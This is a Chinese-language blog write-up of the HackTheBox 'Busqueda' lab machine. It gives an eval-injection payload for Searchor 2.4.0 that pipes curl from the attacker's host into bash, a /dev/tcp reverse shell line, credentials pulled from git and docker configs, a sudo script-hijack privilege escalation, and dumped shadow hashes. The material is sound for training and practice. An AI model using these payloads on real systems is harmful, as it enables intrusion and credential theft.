---
title: Busqueda - HackTheBox
url: https://darkwing.moe/2023/04/10/Busqueda-HackTheBox/
source: 喵喵喵喵
date: 2023-04-11
fetch_date: 2025-10-04T11:29:51.547571
---

# Busqueda - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

Busqueda - HackTheBox

# Busqueda - HackTheBox

##### 2023-04-10

#### TOC

1. [1. 基本信息](#基本信息)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 80](#80)
3. [3. searchor](#searchor)
4. [4. user flag](#user-flag)
5. [5. 提权信息](#提权信息)
   1. [5.1. docker](#docker)
   2. [5.2. gitea](#gitea)
6. [6. 提权 & root flag](#提权-amp-root-flag)
   1. [6.1. shadow](#shadow)
7. [7. 参考资料](#参考资料)

# Busqueda - HackTheBox

2023-04-10

# 基本信息

* <https://app.hackthebox.com/machines/Busqueda>
* 10.10.11.208

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041001.jpg)

# 端口扫描

22和80:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.208 Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-10 13:09 CST Nmap scan report for 10.10.11.208 Host is up (0.11s latency). Not shown: 998 closed tcp ports (conn-refused) PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA) |_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519) 80/tcp open  http    Apache httpd 2.4.52 |_http-server-header: Apache/2.4.52 (Ubuntu) |_http-title: Did not follow redirect to http://searcher.htb/ Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 42.07 seconds ``` |

## 80

需要加hosts：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` 10.10.11.208 searcher.htb ``` |

一个聚合搜索,Searchor 2.4.0:

* ArjunSharda/Searchor: ⚡️ Quick and easy searching tasks in one library.
  <https://github.com/ArjunSharda/Searchor>

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041002.jpg)

# searchor

搜索发现相关漏洞：

* searchor vulnerabilities | Snyk
  <https://security.snyk.io/package/pip/searchor>
* Merge pull request #130 from dan-pavlov/remove-eval-from-cli · ArjunSharda/Searchor@1601650
  <https://github.com/ArjunSharda/Searchor/commit/16016506f7bf92b0f21f51841d599126d6fcd15b>

根据代码可以知道原本直接使用eval执行了query，所以构造poc:

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` # cat shell bash -i >& /dev/tcp/10.10.14.8/4444 0>&1  engine=GitHub&query=http%3a//127.0.0.1/debug'%2beval(compile('for+x+in+range(1)%3a\n+import+os\n+os.system("curl+http%3a//10.10.14.8:7777/shell|bash")','a','single'))%2b'&auto_redirect= ``` |

# user flag

得到svc用户shell：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041003.jpg)

# 提权信息

写公钥后ssh登录方便操作，然后简单的枚举，`/var/www/app/.git/config`中得到密码，svc用户复用这个密码，检查sudo发现python：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041004.jpg)

对应文件没有读权限，直接尝试运行给出三个选项，测试运行发现3000端口的gitea和mysql容器：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041005.jpg)

## docker

使用给出的docker-inspect查看配置信息：

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` sudo python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' mysql_db sudo python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' gitea  "MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF","MYSQL_USER=gitea","MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh","MYSQL_DATABASE=gitea" ``` |

## gitea

转发3000端口访问gitea，administrator复用了mysql的密码(用户名可以用cody用户登录进去得到)：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` ssh svc@10.10.11.208 -L 3000:127.0.0.1:3000  administrator yuiu1hoiu4i5ho1uh ``` |

登录进去发现scripts，里面发现对应的脚本文件:

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041006.jpg)

查看system-checkup，发现当执行full-checkup时，执行的是当前路径的full-checkup.sh：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041007.jpg)

那么我们就可以自定义一个full-checkup.sh来执行任意命令

# 提权 & root flag

自定义一个full-checkup.sh来执行任意命令

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 ``` | ``` svc@busqueda:/tmp/miao$ nano ./full-checkup.sh svc@busqueda:/tmp/miao$ cat full-checkup.sh #!/bin/bash chmod +s /bin/bash svc@busqueda:/tmp/miao$ ls -al /bin/bash -rwxr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash svc@busqueda:/tmp/miao$ chmod +x full-checkup.sh svc@busqueda:/tmp/miao$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup  [+] Done! svc@busqueda:/tmp/miao$ ls -al /bin/bash -rwsr-sr-x 1 root root 1396520 Jan  6  2022 /bin/bash svc@busqueda:/tmp/miao$ /bin/bash -p ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041008.jpg)

## shadow

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` root:$y$j9T$gvo.xCkdFraDE0rqgshTQ0$WXZwNFLr3bmzWWE0xwRJjJBbKk9nHOUPa7C7Pgaaj/D:19363:0:99999:7::: svc:$y$j9T$W0hJlLgllX2dVYzi/khoR.$DEi7R3YR2b.63JxcCdxOecK48PTrm5SZXM2HI84imO6:19363:0:99999:7::: ``` |

# 参考资料

* ArjunSharda/Searchor: ⚡️ Quick and easy searching tasks in one library.
  <https://github.com/ArjunSharda/Searchor>
* Merge pull request #130 from dan-pavlov/remove-eval-from-cli · ArjunSharda/Searchor@1601650
  <https://github.com/ArjunSharda/Searchor/commit/16016506f7bf92b0f21f51841d599126d6fcd15b>

> Last updated: 2023-08-14 11:03:22
>
> 水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
>
> [![暗羽](/img/avatar.jpg)
> 暗羽](https://darkwing.moe)

* [HackTheBox](/tags/HackTheBox/)

[Prev

#### Mailroom - HackTheBox](/2023/04/19/Mailroom-HackTheBox/)

[Next

#### Coder - HackTheBox](/2023/04/05/Coder-HackTheBox/)

站点总访客数：

站点总访问量：

This blog is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).

暗羽 © 2014 - 2025

Power by [Hexo](http://hexo.io/) Theme [indigo](https://github.com/yscoder/hexo-theme-indigo)

扫一扫，分享到微信

![微信分享二维码](data:image/png;base64...)

- [{title}

  {tags}

  {date}](%7Bpath%7D)